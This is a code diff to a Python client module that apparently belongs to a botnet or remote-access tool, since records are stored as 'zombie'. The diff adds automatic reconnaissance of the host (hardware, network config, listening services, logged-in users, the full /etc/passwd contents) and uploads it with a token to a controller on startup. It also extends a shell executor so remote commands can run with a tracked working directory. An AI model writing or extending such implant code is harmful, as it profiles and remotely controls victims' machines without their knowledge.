@@ -2,24 +2,38 @@
 # -*- coding: utf-8 -*-
 # r3nt0n
 
-import socket, platform, os
+import socket, platform, os, json
 from subprocess import STDOUT, check_output, CalledProcessError
 
-from app.components import logger
+from app.components import logger, config
 from app.modules import http_client
-#from app.modules.backup_settings import get_zombie_settings, set_zombie_settings
-
 
 
 class Machine:
     def __init__(self):
         self.output = None
+        self.cwd = config.APP_DIR
         self.info = {
             'public_ip': '',
             'country': '',
             'private_ip': '',
             'hostname': '',
-            'current_user': ''
+            'os': '',
+            'os_details': '',
+            'arch': '',
+            'manufacturer': '',
+            'model': '',
+            'cpu': '',
+            'n_processors': '',
+            'memory': '',
+            'drives_usage': '',
+            'current_user': '',
+            'human_users': '',
+            'users_online': '',
+            'all_users': '',
+            'netconfig': '',
+            'svc_listen': '',
+            'chipset_pci_bus': ''
         }
 
     def get_private_ip(self):
@@ -47,7 +61,7 @@ class Machine:
 
     def get_hostname(self):
         # return os.uname()[1]
-        # test which works on windows
+        # still need to test which works on windows
         # ...
         #return socket.gethostname()
         try:
@@ -77,9 +91,135 @@ class Machine:
         self.get_private_ip()
         self.get_current_user()
 
+    def refresh_system_info(self):
+        self.get_system_info()
+        #self.get_detailed_hw_info()
+
+    def get_detailed_hw_info(self):
+        # windows data
+        if platform.system() == 'Windows':
+            import wmi
+            c = wmi.WMI()
+            my_system = c.Win32_ComputerSystem()[0]
+            # ...
+            # ...s
+
+        # linux data
+        if platform.system() == 'Linux':
+            self.info['detailed_hw'] = self.execute_comand("hwinfo")
+
+    def get_system_info(self):
+
+        self.info['os_details'] = platform.platform()
+
+        # windows data
+        if platform.system() == 'Windows':
+            import wmi
+            c = wmi.WMI()
+            my_system = c.Win32_ComputerSystem()[0]
+            self.info['os'] = 'windows'
+            self.info["arch"] = my_system.SystemType
+            self.info['manufacturer'] = my_system.Manufacturer
+            self.info['model'] = my_system.Model
+            self.info['memory'] = self.execute_comand("wmic MemoryChip get BankLabel, Capacity, MemoryType, TypeDetail, Speed")
+            self.info['cpu'] = self.execute_comand("wmic CPU get NAME")
+            self.info["n_processors"] = my_system.NumberOfProcessors
+            self.info["drives_usage"] = self.execute_comand("wmic logicaldisk get size, freespace, caption")
+            self.info["netconfig"] = self.execute_comand("ipconfig /all")
+            self.info["svc_listen"] = self.execute_comand("ss -tlnp")
+
+        # android data
+        elif platform.system() == "Linux":
+            from os import environ
+            if 'ANDROID_STORAGE' in environ:
+                self.info['os'] = 'android'
+
+        # linux data
+            else:
+                self.info['os'] = 'linux'
+                self.info['arch'] = self.execute_comand("uname -m")
+                self.info['manufacturer'] = self.execute_comand("cat /sys/class/dmi/id/board_vendor")
+                self.info['model'] = self.execute_comand("cat /sys/class/dmi/id/product_name")
+                self.info['memory'] = self.execute_comand("free -h --si")
+                self.info['cpu'] = self.execute_comand("grep '^model name' /proc/cpuinfo | cut -d':' -f2 | uniq")
+                self.info['n_processors'] = self.execute_comand("grep -c ^processor /proc/cpuinfo")
+                self.info["drives_usage"] = self.execute_comand("df -h")
+                self.info["human_users"] = self.execute_comand("cut -d: -f1,3 /etc/passwd | egrep ':[0-9]{4}$' | cut -d: -f1")
+                self.info["users_online"] = self.execute_comand("who")
+                self.info["all_users"] = self.execute_comand("cat /etc/passwd")
+                self.info["netconfig"] = self.execute_comand("ip addr")
+                self.info["svc_listen"] = self.execute_comand("ss -tlnp")
+                self.info['chipset_pci_bus'] = self.execute_comand("lspci")
+
+        # ios data
+        elif platform.system() == "Darwin":
+            self.info['os'] = 'ios'
+
+    def upload_system_info(self):
+        from app.components import token
+        from app.modules import crud
+        data = {
+            "jwt": token.jwt,
+            "sysinfo": json.dumps(self.info)  # ,
+            # 'os_details': machine.info['os_details']  # still need to think a smart way to store and represent nested info
+        }
+
+        logger.log('trying to update OS info', 'DEBUG')
+        try:
+            if crud.update_data('zombie', data):
+                logger.log('OS info updated', 'SUCCESS')
+        except Exception as e:
+            logger.log(e, 'ERROR')
+            logger.log('error trying to update OS info', 'ERROR')
+            pass
+
+    def startup_tasks(self):
+        # refresh os info only one time per session
+        logger.log('executing startup tasks...', 'OTHER')
+        self.upload_system_info()
+
+    def autorecon(self):
+        logger.log('starting autorecon module...', 'OTHER')
+        self.refresh_local_net_info()
+        self.refresh_public_net_info()
+        self.refresh_system_info()
+
+    def change_dir(self, new_path):
+        new_path = os.path.expandvars(new_path)
+        if os.path.exists(new_path):
+            os.chdir(new_path)
+            self.cwd = os.getcwd()
+            logger.log('session current working dir changed to {}'.format(os.getcwd()), 'DEBUG')
+            return True
+        return False
+
     def execute_comand(self, command, timeout=50):
         try:
-            self.output = check_output(command, stderr=STDOUT, timeout=timeout, shell=True)
+            # before every command, change dir to current working directory
+            self.change_dir(self.cwd)
+            logger.log('change dir to session current working dir ({})'.format(os.getcwd()), 'DEBUG')
+
+            # change current working dir if requested
+            if command.startswith('cd'):
+                command = (command.split())
+                if len(command) == 2:
+                    if self.change_dir(command[1]):
+                        self.output = os.getcwd()
+
+            # execute command
+            else:
+                self.output = check_output(command, stderr=STDOUT, timeout=timeout, shell=True)
+                if self.output:
+                    self.output = self.output.decode("utf-8")
+                else:
+                    self.output = ' '
+
+            #after every command, change dir to app base directory
+            os.chdir(config.APP_DIR)
+            logger.log('returned back to app dir ({})'.format(os.getcwd()), 'DEBUG')
+
+            #return self.output
             return self.output
-        except CalledProcessError:
-            return False
+
+        except CalledProcessError as e:
+            return e.output.decode("utf-8")
